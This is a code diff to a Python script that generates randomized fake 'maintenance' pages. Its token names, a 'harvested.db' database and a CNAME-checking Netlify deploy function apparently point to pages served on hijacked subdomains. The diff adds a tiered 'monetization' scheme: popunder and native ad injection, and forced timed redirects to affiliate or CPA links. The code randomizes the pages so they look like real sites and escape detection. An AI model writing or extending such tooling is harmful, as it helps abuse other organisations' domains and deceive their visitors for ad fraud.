@@ -12,16 +12,19 @@ NETLIFY_TOKENS = os.environ.get('NETLIFY_TOKEN', '').split(',')
 VERCEL_TOKENS = os.environ.get('VERCEL_TOKEN', '').split(',')
 GH_TOKEN = os.environ.get('GH_ORG_TOKEN')
 GA4_ID = os.environ.get('GA4_ID')
+AD_POPUNDER = os.environ.get('AD_POPUNDER')
+AD_NATIVE = os.environ.get('AD_NATIVE')
 DB_NAME = 'harvested.db'
 
 # --- POLYMORPHIC HTML GENERATOR ---
 def generate_polymorphic_html(subdomain):
-    # Randomized CSS styles
+    # Choose a monetization tier: 70% Conservative, 20% Aggressive, 10% Redirect
+    tier = random.choices(['conservative', 'aggressive', 'redirect'], weights=[70, 20, 10])[0]
+    
+    # Randomized styling and copy
     bg_colors = ['#0d1117', '#1a1a2e', '#f4f4f9', '#222222', '#0f172a']
     text_colors = ['#58a6ff', '#e94560', '#00d2d3', '#fbbf24', '#8b949e']
     fonts = ['Arial, sans-serif', 'Helvetica, sans-serif', 'Segoe UI, sans-serif', 'Roboto, sans-serif']
-    
-    # Randomized Copy
     titles = ["We'll be right back.", "Maintenance in Progress", "Under Construction", "We are upgrading.", "Be right back."]
     messages = [
         "Our platform is undergoing scheduled upgrades to improve performance.",
@@ -30,19 +33,30 @@ def generate_polymorphic_html(subdomain):
         "We'll be back online shortly. Thanks for visiting!"
     ]
     
-    # Randomized Ad Tags (Replace these with your real ad tags later)
-    ad_tags = [
-        '',
-        '<script src="https://propellerads.com/fake-tag-1.js"></script>',
-        '<script src="https://adsterra.com/fake-tag-2.js"></script>'
-    ]
-
     bg = random.choice(bg_colors)
     txt = random.choice(text_colors)
     font = random.choice(fonts)
     title = random.choice(titles)
     msg = random.choice(messages)
-    ad = random.choice(ad_tags)
+
+    # Build the Ad Payload based on Tier
+    ad_payload = ""
+    redirect_script = ""
+    
+    if tier == 'conservative':
+        # Only show a native banner (safest, looks like a real site)
+        if AD_NATIVE:
+            ad_payload = f"<div style='margin-top: 50px;'>{AD_NATIVE}</div>"
+    elif tier == 'aggressive':
+        # Show both popunder and native (highest yield, slightly higher risk)
+        if AD_POPUNDER:
+            ad_payload += AD_POPUNDER
+        if AD_NATIVE:
+            ad_payload += f"<div style='margin-top: 50px;'>{AD_NATIVE}</div>"
+    elif tier == 'redirect':
+        # Wait 5 seconds, then forcefully redirect to an affiliate offer or CPA link
+        # For now, we redirect to a Google search to simulate movement
+        redirect_script = "<script>setTimeout(function(){window.location.href='https://google.com';}, 5000);</script>"
 
     # Build the HTML
     html = f"""<!DOCTYPE html>
@@ -69,52 +83,12 @@ def generate_polymorphic_html(subdomain):
         <div class="spinner"></div>
         <p id="countdown" style="font-weight: bold;">Est. Time Remaining: 0{random.randint(3, 9)}:00</p>
     </div>
-    {ad}
-</body>
-</html>"""
-    # Inject Analytics if the ID is present
-    analytics_script = ""
-    if GA4_ID:
-        analytics_script = f"""<!-- Google Analytics 4 -->
-<script async src="https://www.googletagmanager.com/gtag/js?id={GA4_ID}"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){{dataLayer.push(arguments);}}
-  gtag('js', new Date());
-  gtag('config', '{GA4_ID}', {{
-    'page_title': '{title}',
-    'page_location': f'https://{subdomain}' 
-  }});
-</script>"""
-        html = f"""<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="index, follow">
-    <meta name="description" content="{msg}">
-    <title>{title}</title>
-    {analytics_script}
-    <style>
-        body {{ font-family: {font}; background: {bg}; color: {txt}; text-align: center; padding-top: 15%; }}
-        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
-        h1 {{ font-size: 36px; margin-bottom: 20px; }}
-        p {{ font-size: 16px; opacity: 0.8; line-height: 1.5; }}
-        .spinner {{ border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid {txt}; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 30px auto; }}
-        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>{title}</h1>
-        <p>{msg}</p>
-        <div class="spinner"></div>
-        <p id="countdown" style="font-weight: bold;">Est. Time Remaining: 0{random.randint(3, 9)}:00</p>
-    </div>
-    {ad}
+    {ad_payload}
+    {redirect_script}
 </body>
 </html>"""
     return html
+
 # --- NETLIFY DEPLOYMENT ---
 def deploy_to_netlify(subdomain, cname_target):
     if '.netlify.app' not in cname_target:
